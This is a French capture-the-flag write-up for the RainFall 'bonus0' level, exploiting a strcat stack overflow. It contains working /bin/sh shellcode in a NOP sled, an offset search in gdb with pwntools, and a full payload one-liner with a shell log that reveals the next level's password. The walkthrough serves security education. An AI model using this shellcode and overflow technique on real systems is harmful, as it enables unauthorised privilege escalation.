# Bonus0

## Test de l'éxécutable

Commençons par voir ce que fait le binaire.

```shell
  bonus0@RainFall:~$ ./bonus0 
   - 
  a
   - 
  d
  a d
```

> Le programme nous demande d'entrer deux chaînes de caractères avant de les afficher concaténées.

## Analyse de la vulnérabilité

En utilisant dogbolt, nous pouvons analyser le binaire pour comprendre son fonctionnement. Après examen, on constate que le programme utilise `strcat()`, une fonction connue pour ses problèmes de débordement de buffer (buffer overflow).

**Le problème :** `strcat()` ne vérifie pas la taille du buffer de destination avant de copier. Si on envoie plus de données que prévu, on peut écraser des zones mémoire critiques.

## Stratégie d'exploitation

Pour exploiter cette vulnérabilité, nous avons besoin de :

1. **Créer un shellcode** : un petit programme en code machine qui ouvre un shell
2. **Trouver son adresse en mémoire** : pour rediriger l'exécution vers notre code
3. **Trouver le décalage (offset)** : combien d'octets il faut écrire avant d'atteindre l'adresse de retour (**9** octets dans notre cas)

> **Pourquoi utiliser un shellcode ?** Nos buffers font seulement **20** octets. Pour une attaque ret2libc, il faudrait au minimum **12** octets, mais nous n'en avons que **11** disponibles. Le shellcode est donc notre seule option.

## Étape 1 : Préparer le shellcode

```shell
$> export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
```

**Explication :**
- `\x90` = instruction NOP (No Operation) : elle ne fait rien, juste passer à l'instruction suivante
- On met **1000 NOP** avant le shellcode réel
- **Pourquoi ?** Si l'adresse mémoire change légèrement, on a plus de chances de "tomber" dans notre zone de NOP, qui nous mènera jusqu'au shellcode réel.
- `"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"` : cette suite d'octet ferme stdin, ouvre /dev/tty pour rattacher le programme au terminal, puis exécute /bin/sh afin d’obtenir un shell interactif.

## Étape 2 : Trouver l'adresse du shellcode en mémoire

Nous devons savoir où notre variable d'environnement `SHELLCODE` est stockée en mémoire. Pour cela, utilisons ce petit programme :

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
  printf("env address at %p\n", getenv(argv[1]));
  return (0);
}
```

> En compilant et exécutant ce programme avec `SHELLCODE` comme paramètre, il affichera l'adresse mémoire où notre shellcode est stocké.

**Exemple d'utilisation :**
```shell
$> gcc getenv.c -o getenv
$> ./getenv SHELLCODE
env address at 0xbffffXXX
```

Notons cette adresse, nous en aurons besoin pour l'exploit final.

## Etape 3 : Trouver le offset

Comme ici les buffer sont stockés sur la stack, on peut utiliser la fonction cyclic() de la bibliotheque python pour générer un pattern qui permettra d'identifier l'offset sur lequel le programme segfault :

```shell
(cons310_i2) ➜  bonus0 git:(main) ✗ python3 -c "from pwn import *; print(cyclic(100))"                  
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

On passe ensuite ce pattern en argument du programme

```shell
bonus0@RainFall:~$ gdb ./bonus0 
[...]
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 - 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
aaaabaaacaaadaaaeaaaaaaabaaacaaadaaaeaaa??? aaaabaaacaaadaaaeaaa???

Program received signal SIGSEGV, Segmentation fault.
0x64616161 in ?? ()
(gdb) 
```

On récupère ensuite la valeur du offset avec cyclic_find() : 

```
(cons310_i2) ➜  bonus0 git:(main) ✗ python -c "from pwn import *; print(cyclic_find(0x64616161))"
9
```

Le offset est de 9

## Étape 3 : Construire l'exploit

Maintenant, construisons notre payload :

1. **Premier buffer** : remplir avec **4096** octets (pour saturer le buffer de lecture)
2. **Deuxième buffer** : 
   - Décaler de **9** octets (offset)
   - Placer l'**adresse du shellcode** (en little-endian, donc inversée)
   - Remplir les **7** octets restants avec du padding

```shell
  $> (python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\xXX\xXX\xXX\xXX'[::-1] + '\x90' * 7"; cat) | ./bonus0
   -
   -
  r r
  $ cat /home/user/bonus1/.pass
  cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

**Décomposition de la commande :**
- `'\x90' * 4095 + '\n'` : remplit le premier buffer (4095 NOP + retour à la ligne)
- `'\x90' * 9` : décalage de 9 octets dans le deuxième buffer
- `'\xXX\xXX\xXX\xXX'[::-1]` : adresse du shellcode inversée (little-endian)
- `'\x90' * 7` : padding pour remplir les 7 octets restants
- `cat` : permet de garder le shell ouvert pour interagir avec


### Log shell entier :

```shell
# Création de l'env var
bonus0@RainFall:~$ export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`

# Récupération de l'adresse de l'env var
bonus0@RainFall:~$ cd /tmp/
bonus0@RainFall:/tmp$ touch prog.c
bonus0@RainFall:/tmp$ nano prog.c
bonus0@RainFall:/tmp$ cc prog.c 
bonus0@RainFall:/tmp$ ./a.out SHELLCODE
env address at 0xbffff514

# Payload
bonus0@RainFall:/tmp$ cd ~
bonus0@RainFall:~$ (python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\xbf\xff\xf5\x14'[::-1] + '\x90' * 7"; cat) | ./bonus0
 - 
 - 
?????????????????????????????????????????? ??????????????????????
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
